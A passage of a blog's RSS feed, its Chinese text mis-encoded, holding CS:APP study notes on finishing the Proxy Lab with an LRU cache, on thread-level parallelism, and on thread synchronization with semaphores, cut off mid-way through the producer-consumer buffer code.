&lt;p&gt;æ¯æ¬¡å‡ºé”™,åå°æ€»ä¼šæœ‰é—ç•™çš„åƒµå°¸è¿›ç¨‹,è¦ä¸€ä¸ªä¸€ä¸ªkillæ‰...ğŸ˜…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æŸ¥çœ‹./driver.shè„šæœ¬,å‘ç°ç¬¬298~302è¡Œé™„è¿‘:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;# Run a special blocking nop-server that never responds to requests
nop_port=$(free_port)
echo &amp;quot;Starting the blocking NOP server on port ${nop_port}&amp;quot;
./nop-server.py ${nop_port} &amp;amp;&amp;gt; /dev/null &amp;amp;
nop_pid=$!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pythonè„šæœ¬å“ªé‡Œèƒ½ç›´æ¥å½“å¯æ‰§è¡Œæ–‡ä»¶?è¿™æ˜¯Python2æ—¶ä»£æ˜¯è¿™æ ·çš„å—?æˆ‘è®°å¾—ä¹‹å‰å“ªä¸ªå®éªŒä¹Ÿæ˜¯è¿™ä¸ªé—®é¢˜.
æ”¹ä¸º&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;python3 ./nop-server.py ${nop_port} &amp;amp;&amp;gt; /dev/null &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœç„¶æˆåŠŸäº†!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./driver.sh
*** Basic ***
Starting tiny on 24188
Starting proxy on 13850
1: home.html
   Fetching ./tiny/home.html into ./.proxy using the proxy
   Fetching ./tiny/home.html into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
2: csapp.c
   Fetching ./tiny/csapp.c into ./.proxy using the proxy
   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
3: tiny.c
   Fetching ./tiny/tiny.c into ./.proxy using the proxy
   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
4: godzilla.jpg
   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy
   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
5: tiny
   Fetching ./tiny/tiny into ./.proxy using the proxy
   Fetching ./tiny/tiny into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
Killing tiny and proxy
basicScore: 40/40

*** Concurrency ***
Starting tiny on port 10579
Starting proxy on port 6922
Starting the blocking NOP server on port 3642
Trying to fetch a file from the blocking nop-server
Fetching ./tiny/home.html into ./.noproxy directly from Tiny
Fetching ./tiny/home.html into ./.proxy using the proxy
Checking whether the proxy fetch succeeded
Success: Was able to fetch tiny/home.html from the proxy.
Killing tiny, proxy, and nop-server
concurrencyScore: 15/15
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;Part III:Webç¼“å­˜&lt;/h1&gt;
&lt;p&gt;ç»™æœ€è¿‘ä½¿ç”¨çš„é¡µé¢å¢åŠ ä¸€å±‚ç¼“å­˜.HTTPå®é™…ä¸Šå®šä¹‰äº†å¤æ‚çš„ç¼“å­˜æ¨¡å‹.ä½†å®éªŒå°†é‡‡ç”¨ç®€åŒ–çš„æ–¹æ³•.æˆ‘ä¹ŸçŸ¥é“,å¦‚æœé¡µé¢ç¼“å­˜è¶…è¿‡ä¸€å®šæ—¶é—´,é¡µé¢å¯èƒ½å‘ç”Ÿäº†å˜åŒ–,æ˜¾ç„¶åº”è¯¥æŠŠå®ƒç§»é™¤ç¼“å­˜,ä½†æœ¬å®éªŒæ²¡æœ‰è€ƒè™‘è¿™ä¸€ç‚¹,ä»…ä»…æ˜¯ç®€å•çš„LRUç¼“å­˜æ›¿æ¢ç­–ç•¥.
ç»™ç¼“å­˜é‡‡å–é™åˆ¶:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æœ€å¤§ç¼“å­˜å¤§å°:1MB&lt;/li&gt;
&lt;li&gt;æœ€å¤§ç¼“å­˜é¡µé¢å¤§å°:100KB&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¯´èµ·Cache,åº”è¯¥æ˜¯è®©æˆ‘è®¾è®¡å›ºå®šå¤§å°çš„ç¼“å­˜å—,ä¸æ˜¯åƒMalloclabé‚£æ ·çš„ç¢ç‰‡.ä¹Ÿå°±æ˜¯è¯´,å›ºå®šæœ‰10ä¸ªé¡µé¢ç¼“å­˜.
å›é¡¾[[Cachelab]]çš„ä»£ç ,æˆ‘è®¾è®¡å‡ºç›¸ä¼¼çš„æ•°æ®ç»“æ„.&lt;/p&gt;
&lt;p&gt;å¦‚æœç¼“å­˜å‘½ä¸­,å°†å‘½ä¸­çš„é¡µé¢çš„timestampè®¾ç½®ä¸º0,å…¶ä»–æ‰€æœ‰é¡µé¢åŠ 1;å¦‚æœç¼“å­˜ä¸å‘½ä¸­,è·å–è¯¥é¡µé¢,å¯»æ‰¾ç©ºé—²é¡µé¢å¡«å…¥(å¦‚æœæ²¡æœ‰ç©ºé—²é¡µé¢,å¯»æ‰¾timestampæœ€å¤§çš„é¡µé¢æ›¿æ¢),å°†å…¶ä»–æ‰€æœ‰é¡µé¢åŠ 1.&lt;/p&gt;
&lt;p&gt;æˆ‘é€šè¿‡&lt;code&gt;man 3 sprintf&lt;/code&gt;äº†è§£åˆ°,ç›®å‰&lt;code&gt;sprintf&lt;/code&gt;å·²ç»æ˜¯çº¿ç¨‹å®‰å…¨å‡½æ•°.&lt;/p&gt;
&lt;h2&gt;æµ‹è¯•ç»“æœ&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./driver.sh
gcc -g -Wall proxy.o csapp.o sbuf.o -o proxy -lpthread
*** Basic ***
Starting tiny on 11304
Starting proxy on 25852
1: home.html
   Fetching ./tiny/home.html into ./.proxy using the proxy
   Fetching ./tiny/home.html into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
2: csapp.c
   Fetching ./tiny/csapp.c into ./.proxy using the proxy   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
3: tiny.c
   Fetching ./tiny/tiny.c into ./.proxy using the proxy
   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
4: godzilla.jpg
   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy
   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
5: tiny
   Fetching ./tiny/tiny into ./.proxy using the proxy
   Fetching ./tiny/tiny into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
Killing tiny and proxy
basicScore: 40/40

*** Concurrency ***
Starting tiny on port 24301
Starting proxy on port 7349
Starting the blocking NOP server on port 27021
Trying to fetch a file from the blocking nop-server
Fetching ./tiny/home.html into ./.noproxy directly from Tiny
Fetching ./tiny/home.html into ./.proxy using the proxy
Checking whether the proxy fetch succeeded
Success: Was able to fetch tiny/home.html from the proxy.
Killing tiny, proxy, and nop-server
concurrencyScore: 15/15

*** Cache ***
Starting tiny on port 3492
Starting proxy on port 12373
Fetching ./tiny/tiny.c into ./.proxy using the proxy
Fetching ./tiny/home.html into ./.proxy using the proxy
Fetching ./tiny/csapp.c into ./.proxy using the proxy
Killing tiny
Fetching a cached copy of ./tiny/home.html into ./.noproxy
Success: Was able to fetch tiny/home.html from the cache.
Killing proxy
cacheScore: 15/15

totalScore: 70/70
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡æ‰€æœ‰æµ‹è¯•!&lt;/p&gt;
&lt;h1&gt;åœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨&lt;/h1&gt;
&lt;p&gt;åªæ”¯æŒHTTP/1.0çš„GETè¯·æ±‚å¯¹äºç°ä»£ç½‘ç«™æ¥è¯´å¤ªå±€é™äº†.ä¸è¿‡,æˆ‘å¯ä»¥è®¿é—®localhostçš„tinyæœåŠ¡å™¨:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214001902.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214002220.png&quot; alt=&quot;&quot;&gt;
é€šè¿‡ä»£ç†æœåŠ¡å™¨,å¯ä»¥ç¿»è¶ŠGFW,è‡ªç”±ä¹‹é“,è•´äºå…¶ä¸­.äº²è‡ªå®ç°è¿™ä¸ªä»£ç†æœåŠ¡å™¨,æˆ‘è¿˜æ˜¯æ·±æœ‰æ„Ÿè§¦çš„.
æœ¬å®éªŒæ¯”è¾ƒç®€å•è€Œä¸”æˆ‘ä¹Ÿæœ‰è®¡ç®—æœºç½‘ç»œå’Œç½‘ç»œç¼–ç¨‹åŸºç¡€,æ‰€ä»¥æˆ‘åªç”¨äº†1å¤©æ—¶é—´å°±å®Œæˆäº†.&lt;/p&gt;
&lt;p&gt;è‡³æ­¤, CMU CS15-213çš„æ‰€æœ‰å®éªŒå·²ç»é¡ºåˆ©å®Œæˆ!
å®Œå–„æ”¶å°¾å·¥ä½œå,æˆ‘ä¼šå°†æ‰€æœ‰å®éªŒä»£ç ,Markdownç¬”è®°ä¸Šä¼ åˆ°Github,ä¾›æœ‰ç¼˜äººå­¦ä¹ å‚è€ƒ!&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Wed, 12 Feb 2025 16:00:00 GMT</pubDate></item><item><title>çº¿ç¨‹çº§å¹¶è¡Œ</title><link>https://www.tankimzeg.top/blog/%E7%BA%BF%E7%A8%8B%E7%BA%A7%E5%B9%B6%E8%A1%8C/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E7%BA%BF%E7%A8%8B%E7%BA%A7%E5%B9%B6%E8%A1%8C/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E7%BA%BF%E7%A8%8B%E7%BA%A7%E5%B9%B6%E8%A1%8C/&quot;&gt;https://www.tankimzeg.top/blog/%E7%BA%BF%E7%A8%8B%E7%BA%A7%E5%B9%B6%E8%A1%8C/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;å¹¶è¡Œè®¡ç®—ç¡¬ä»¶&lt;/h1&gt;
&lt;p&gt;ç»å…¸çš„å¤šæ ¸å¤„ç†å™¨:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214094826.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¹±åºå¤„ç†å™¨ç»“æ„:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214095029.png&quot; alt=&quot;&quot;&gt;
è¶…çº¿ç¨‹çš„åŸºæœ¬æ€æƒ³æ˜¯,90%çš„ç¨‹åºæ²¡æœ‰å®Œå…¨åˆ©ç”¨è¿™äº›åŠŸèƒ½å•å…ƒ.ç‰¹åˆ«æ˜¯å› ä¸ºç¼“å­˜ç¼ºå¤±è€Œé€ æˆé˜»å¡æ—¶,æ‰€æœ‰è¿™äº›ç®—æœ¯å•å…ƒéƒ½å¤„äºç©ºé—²çŠ¶æ€.
å°†å¯„å­˜å™¨,æ“ä½œæŒ‡ä»¤é˜Ÿåˆ—,ç¨‹åºè®¡æ•°å™¨ç­‰ç¿»å€,è¿™æ ·å°±èƒ½è®©å¤šä¸ªçº¿ç¨‹è¿è¡Œèµ·æ¥,ä½†å…±äº«åŠŸèƒ½å•å…ƒ.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214095608.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;çº¿ç¨‹çº§å¹¶è¡Œ&lt;/h1&gt;
&lt;h2&gt;å°†ç¨‹åºåˆ†å‰²æˆå¤šä¸ªç‹¬ç«‹çš„ä»»åŠ¡&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ä¾‹1:å¹¶è¡Œæ±‚å’Œ
  $\sum_{i=0}^{n-1}i=0+1+2+\dots+()n-1)$
  åˆ†å‰²æˆtéƒ¨åˆ†,æ¯ä¸ªéƒ¨åˆ†èŒƒå›´$\lfloor n / t \rfloor$&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Thread routine for psum-array.c */ 
void *sum_array(void *vargp) { 
    long myid = *((long *)vargp); /* Extract thread ID */ 
    long start = myid * nelems_per_thread; /* Start element index */ 
    long end = start + nelems_per_thread; /* End element index */ 
    long i; 
    for (i = start; i &amp;lt; end; i++) { psum[myid] += i; } 
    return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
  ä¸ºäº†å……åˆ†åˆ©ç”¨å¯„å­˜å™¨,ä¾‹ç¨‹åº”ä½¿ç”¨å±€éƒ¨å˜é‡:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Thread routine for psum-local.c */ 
void *sum_local(void *vargp) { 
    long myid = *((long *)vargp); /* Extract thread ID */ 
    long start = myid * nelems_per_thread; /* Start element index */ 
    long end = start + nelems_per_thread; /* End element index */ 
    long i, sum = 0; 
    for (i = start; i &amp;lt; end; i++) { sum += i; } 
    psum[myid] = sum; 
    return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯¹$n=2^{31}$è§„æ¨¡çš„ä»»åŠ¡,ä¸¤è€…çš„è¿è¡Œæ—¶é—´å¦‚ä¸‹:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214102140.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;å¯¹äºpæ ¸å¤„ç†å™¨,$T_{k}$æ˜¯ä½¿ç”¨kæ ¸çš„è¿è¡Œæ—¶é—´
å®šä¹‰:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åŠ é€Ÿæ¯”:$S_{p}=T_{1} / T_{p}$&lt;/li&gt;
&lt;li&gt;æ•ˆç‡æ¯”:$E_{p} = S_{p} / p = T_{1} / (p T_{p})$&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;æ•™è®­&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;é‡‡å–å¹¶è¡Œç­–ç•¥:åˆ†æ²»&lt;/li&gt;
&lt;li&gt;åœ¨å¾ªç¯å†…éƒ¨ä¸è¦å†™åŒæ­¥è¯­å¥,è¿™æ ·ä¼šå¯¼è‡´è¿è¡Œå¾ˆæ…¢&lt;/li&gt;
&lt;li&gt;é˜¿å§†è¾¾å°”å®šå¾‹:å¦‚æœæ€»æ˜¯æå‡æŸä¸€éƒ¨åˆ†çš„æ€§èƒ½,é‚£ä¹ˆå…¶ä»–éƒ¨åˆ†ä¼šç§°ä¸ºç“¶é¢ˆ.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;å†…å­˜ä¸€è‡´æ€§çš„ç¡¬ä»¶ä¿éšœ&lt;/h1&gt;
&lt;p&gt;å¯¹æ¯ä¸ªç¼“å­˜å—æ ‡è®°çŠ¶æ€:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Invalid: Cannot use value&lt;/li&gt;
&lt;li&gt;Shared: Readable copy&lt;/li&gt;
&lt;li&gt;Exclusive: Writeable copy
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250214115924.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Tue, 11 Feb 2025 16:00:00 GMT</pubDate></item><item><title>åŒæ­¥</title><link>https://www.tankimzeg.top/blog/%E5%90%8C%E6%AD%A5/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E5%90%8C%E6%AD%A5/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E5%90%8C%E6%AD%A5/&quot;&gt;https://www.tankimzeg.top/blog/%E5%90%8C%E6%AD%A5/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;çº¿ç¨‹å†…å­˜æ¨¡å‹&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;æ¦‚å¿µæ¨¡å‹&lt;ul&gt;
&lt;li&gt;å¤šä¸ªçº¿ç¨‹åœ¨å•ä¸ªè¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œ.&lt;/li&gt;
&lt;li&gt;æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„çº¿ç¨‹ä¸Šä¸‹æ–‡:çº¿ç¨‹ID,æ ˆ,æ ˆæŒ‡é’ˆ,ç¨‹åºè®¡æ•°å™¨,æ¡ä»¶ç ,å¯„å­˜å™¨å€¼&lt;/li&gt;
&lt;li&gt;æ‰€æœ‰çº¿ç¨‹å…±äº«å‰©ä½™çš„è¿›ç¨‹ä¸Šä¸‹æ–‡,è¿›ç¨‹ä¸Šä¸‹æ–‡ç”±å†…æ ¸ç»´æŠ¤.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å®é™…ä¸Š,çº¿ç¨‹æ˜¯å…±äº«çš„,ä¸è®¾ä¿æŠ¤,ä¸€ä¸ªçº¿ç¨‹çš„æ ˆèƒ½è®¿é—®å¦ä¸€ä¸ªçº¿ç¨‹çš„æ ˆ.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;å˜é‡å†…å­˜æ˜ å°„&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;å…¨å±€å˜é‡:ä»»ä½•å…¨å±€å˜é‡,è™šæ‹Ÿå†…å­˜åªåŒ…å«ä¸€ä¸ªç¤ºä¾‹&lt;/li&gt;
&lt;li&gt;å±€éƒ¨å˜é‡:æ¯ä¸ªçº¿ç¨‹çš„æ ˆåŒ…å«å±€éƒ¨å˜é‡çš„ä¸€ä¸ªç¤ºä¾‹&lt;/li&gt;
&lt;li&gt;å±€éƒ¨é™æ€å˜é‡:ä»»ä½•å±€éƒ¨é™æ€å˜é‡,è™šæ‹Ÿå†…å­˜åªåŒ…å«ä¸€ä¸ªç¤ºä¾‹,åªä¾›è¯¥å‡½æ•°ä½¿ç”¨&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;åŒæ­¥(Synchronization)çº¿ç¨‹&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* badcnt.c */
/* Global shared variable */ 
volatile long cnt = 0; /* Counter */ 
int main(int argc, char **argv) { 
	long niters; 
	pthread_t tid1, tid2; 
	niters = atoi(argv[1]); 
	Pthread_create(&amp;amp;tid1, NULL, thread, &amp;amp;niters); 
	Pthread_create(&amp;amp;tid2, NULL, thread, &amp;amp;niters); 
	Pthread_join(tid1, NULL); 
	Pthread_join(tid2, NULL); 
	
	/* Check result */ 
	if (cnt != (2 * niters)) 
		printf(&amp;quot;BOOM! cnt=%ld\n&amp;quot;, cnt); 
	else printf(&amp;quot;OK cnt=%ld\n&amp;quot;, cnt); 
		exit(0); 
}

/* Thread routine */ 
void *thread(void *vargp) { 
	long i, niters = *((long *)vargp); 
	for (i = 0; i &amp;lt; niters; i++) cnt++; 
	return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªç¨‹åºä¼šå‘ç”ŸåŒæ­¥é”™è¯¯.
&lt;code&gt;voatile&lt;/code&gt;æ˜¯ä¿è¯ç¼–è¯‘å™¨å°†å˜é‡ä»å†…å­˜å­˜å–çš„å…³é”®å­—.
å¯¼è‡´äº†cntå˜é‡è‡ªå¢æ“ä½œçš„éåŸå­æ€§.
åˆ†æç«äº‰æ—¶,ç”šè‡³éœ€è¦ä»æ±‡ç¼–å±‚é¢è§‚å¯Ÿ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	movq (%rdi), %rcx 
	testq %rcx,%rcx 
	jle .L2 
	movl $0, %eax            H:Head
.L3: 
	movq cnt(%rip),%rdx      L:Load cnt
	addq $1, %rdx            U:Update cnt
	movq %rdx, cnt(%rip)     S:Store cnt
	addq $1, %rax 
	cmpq %rcx, %rax 
	jne .L3                  T:Tail
.L2:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;L,U,Sæ˜¯ä¸‰ä¸ªå…³é”®æ“ä½œ,å´æ²¡æœ‰ä¿è¯åŸå­æ€§,é‚£ä¹ˆ,å½“çº¿ç¨‹è¢«è°ƒåº¦æ‰“æ–­å,å°±ä¼šå‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µ.è¿™ä¸€ç‚¹æˆ‘åœ¨æ•°æ®åº“è¯¾ç¨‹ä¸­ä¹Ÿè§è¯†è¿‡äº†.&lt;/p&gt;
&lt;h2&gt;è¿›åº¦å›¾&lt;/h2&gt;
&lt;p&gt;åœ¨å¹¶è¡Œçº¿ç¨‹ä¸­,ä¸€æ¡çº¿æ®µæ˜¯ä¸€ä¸ªåŸå­äº‹åŠ¡.
é€šè¿‡è¿‡ç¨‹å›¾æ¥åˆ†æä¸Šè¿°è¿‡ç¨‹:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211222712.png&quot; alt=&quot;&quot;&gt;
å †å…¨å±€å˜é‡cntè¿›è¡Œæ“ä½œçš„ä¸´ç•ŒåŒºä¸åº”è¯¥è¢«äº¤é”™,ä¸¤ä¸ªä¸´ç•ŒåŒºäº¤é”™çš„åŒºåŸŸç§°ä¸ºä¸å®‰å…¨åŒº.
çœŸå®ä¸€ç›®äº†ç„¶!è¿™æ ·è§£é‡Šå¾ˆæœ‰æ„æ€!&lt;/p&gt;
&lt;h2&gt;ä¿¡å·é‡(Semaphore)&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨ä¿¡å·é‡æ˜¯ä¸€ä¸ªåŸºç¡€çš„è§£å†³åŠæ³•.
ä¿¡å·é‡:éè´Ÿå…¨å±€æ•´æ•°åŒæ­¥å˜é‡.ç”±ä¸¤ä¸ªå†…æ ¸å‡½æ•°På’ŒVæ“ä½œ.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;P(s)&lt;ul&gt;
&lt;li&gt;å¦‚æœséé›¶,é‚£ä¹ˆså‡1å¹¶ç«‹å³è¿”å›&lt;ul&gt;
&lt;li&gt;æ£€æµ‹å’Œå‡å°æ“ä½œæ˜¯åŸå­æ€§çš„&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å¦‚æœsæ˜¯0,é‚£ä¹ˆæŒ‚èµ·çº¿ç¨‹ç›´åˆ°så˜æˆéé›¶ç”±Vå‡½æ•°é‡å¯.&lt;/li&gt;
&lt;li&gt;é‡å¯å,På‡å°så¹¶å°†æ§åˆ¶æƒè¿”å›ç»™è°ƒç”¨è€…&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;V(s)&lt;ul&gt;
&lt;li&gt;å°†så¢åŠ 1(å¢åŠ æ“ä½œæ˜¯åŸå­æ€§çš„)&lt;/li&gt;
&lt;li&gt;å¦‚æœæœ‰çº¿ç¨‹é˜»å¡åœ¨Pæ“ä½œä¸Š,é‡å¯å…¶ä¸­ä¸€ä¸ªçº¿ç¨‹,ç„¶åPæ“ä½œå¯ä»¥å‡å°s
åˆ©ç”¨è¿™ä¸ªéè´Ÿçš„å±æ€§,å¯ä»¥å®ç°å¯¹ä¸´ç•ŒåŒºçš„äº’æ–¥è®¿é—®.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;semaphore.h&amp;gt;
int sem_init(sem_t *s, 0, unsigned int val);} /* s = val */ 
int sem_wait(sem_t *s); /* P(s) */ 
int sem_post(sem_t *s); /* V(s) */
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;äº’æ–¥é”&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;åŸºæœ¬æ€æƒ³:&lt;ul&gt;
&lt;li&gt;å°†ä¸€ä¸ªä¿¡å·é‡&lt;em&gt;mutex&lt;/em&gt;åˆå§‹åŒ–ä¸º1,å…±äº«å˜é‡&lt;/li&gt;
&lt;li&gt;å°†ä¸´ç•ŒåŒºç”¨*P(mutex)&lt;em&gt;å’Œ&lt;/em&gt;V(mutex)*åŒ…è£¹èµ·æ¥,å®ç°äº†&amp;quot;åŠ é”&amp;quot;çš„æ“ä½œ.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;æœ¯è¯­:&lt;ul&gt;
&lt;li&gt;äºŒè¿›åˆ¶ä¿¡å·é‡:æ€»æ˜¯ä¸º0æˆ–1&lt;/li&gt;
&lt;li&gt;mutex:ç”¨äº**äº’æ–¥(mutual exclusion)**çš„äºŒè¿›åˆ¶ä¿¡å·é‡&lt;ul&gt;
&lt;li&gt;Pæ“ä½œ:åŠ é”&lt;/li&gt;
&lt;li&gt;Væ“ä½œ:è§£é”æˆ–é‡Šæ”¾&lt;/li&gt;
&lt;li&gt;æŒæœ‰äº’æ–¥é”:äº’æ–¥é”ä»¥åŠ é”ä½†æœªé‡Šæ”¾&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;è®¡æ•°ä¿¡å·é‡(Counting semaphore):è®¡æ•°å™¨&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¿®æ”¹å¾ªç¯çš„ä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for (i = 0; i &amp;lt; niters; i++) { 
	P(&amp;amp;mutex); 
	cnt++; 
	V(&amp;amp;mutex); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç°åœ¨,è¿‡ç¨‹å›¾å˜æˆè¿™æ ·:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211233255.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;åè°ƒå¯¹å…±äº«èµ„æºçš„è®¿é—®&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;åŸºæœ¬æ€æƒ³&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨ä¿¡å·é‡é€šçŸ¥å…¶ä»–çº¿ç¨‹&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨è®¡æ•°ä¿¡å·é‡è¿½è¸ªèµ„æºçš„çŠ¶æ€&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ä¸¤ä¸ªç»å…¸ä¾‹å­:&lt;ul&gt;
&lt;li&gt;ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜&lt;/li&gt;
&lt;li&gt;è¯»å†™é—®é¢˜&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250212182944.png&quot; alt=&quot;&quot;&gt;
ç”Ÿäº§è€…ç­‰å¾…ç©ºä½,å‘ç¼“å†²åŒºæ”¾å…¥ç‰©å“,ç„¶åé€šçŸ¥æ¶ˆè´¹è€…
æ¶ˆè´¹è€…ç­‰å¾…ç‰©å“,ä»ç¼“å†²åŒºç§»é™¤ç‰©å“,ç„¶åé€šçŸ¥ç”Ÿäº§è€…
éœ€è¦é”å’Œä¸¤ä¸ªè®¡æ•°ä¿¡å·é‡:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mutex:å‘ç¼“å†²åŒºåŠ äº’æ–¥é”&lt;/li&gt;
&lt;li&gt;slots:ç©ºä½æ•°&lt;/li&gt;
&lt;li&gt;items:ç‰©å“æ•°
æ•°æ®ç»“æ„:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;quot;csapp.h&amp;quot;
typedef struct { 
	int *buf; /* Buffer array */ 
	int n; /* Maximum number of slots */ 
	int front; /* buf[(front+1)%n] is first item */ 
	int rear; /* buf[rear%n] is last item */ 
	sem_t mutex; /* Protects accesses to buf */ 
	sem_t slots; /* Counts available slots */ 
	sem_t items; /* Counts available items */ 
} sbuf_t; 

void sbuf_init(sbuf_t *sp, int n); 
void sbuf_deinit(sbuf_t *sp); 
void sbuf_insert(sbuf_t *sp, int item); 
int sbuf_remove(sbuf_t *sp);

/* Create an empty, bounded, shared FIFO buffer with n slots */ 
void sbuf_init(sbuf_t *sp, int n) { 
	sp-&amp;gt;buf = Calloc(n, sizeof(int)); 
	sp-&amp;gt;n = n; /* Buffer holds max of n items */ 
	sp-&amp;gt;front = sp-&amp;gt;rear = 0; /* Empty buffer iff front == rear */ 
	Sem_init(&amp;amp;sp-&amp;gt;mutex, 0, 1); /* Binary semaphore for locking */ 
	Sem_init(&amp;amp;sp-&amp;gt;slots, 0, n); /* Initially, buf has n empty slots */ 
	Sem_init(&amp;amp;sp-&amp;gt;items, 0, 0); /* Initially, buf has 0 items */ 
} 

/* Clean up buffer sp */ 
void sbuf_deinit(sbuf_t *sp) { Free(sp-&amp;gt;buf); }
/* Insert item onto the rear of shared buffer sp */ 
void sbuf_insert(sbuf_t *sp, int item) { 
